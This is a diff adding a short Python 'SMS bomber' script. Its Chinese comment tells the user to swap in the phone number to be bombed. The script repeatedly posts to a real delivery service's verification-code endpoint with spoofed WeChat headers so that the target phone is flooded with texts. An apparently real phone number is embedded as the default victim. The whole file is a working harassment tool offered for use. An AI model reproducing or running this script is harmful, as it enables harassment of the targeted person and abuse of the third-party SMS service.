@@ -1,0 +1,17 @@
+# -*- coding:utf-8 -*-
+# 短信轰炸鸡，把其中的18281088157换成你要轰炸的号码就行了
+import requests
+import time
+
+for i in range(10):
+    headers = {'Host': 'user.mapi.jiashuangkuaizi.com', 'Content-Type': 'application/x-www-form-urlencoded',
+               'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Accept': '*/*',
+               'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.6.6 NetType/WIFI Language/zh_CN',
+               'Referer': 'https://servicewechat.com/wx712367736f80857d/15/page-frame.html', 'Content-Length': '109',
+               'Accept-Language': 'zh-cn'}
+    data = 'phone=18281088157&_platform=wxapp&_version=3.9.8&_osversion=wxapp&_device=wxapp&_city=110100&utoken=undefined'
+
+    x = requests.post('https://user.mapi.jiashuangkuaizi.com/Passport/sendVerificationCode', data=data, headers=headers)
+    print(x.text)
+    time.sleep(20)
+
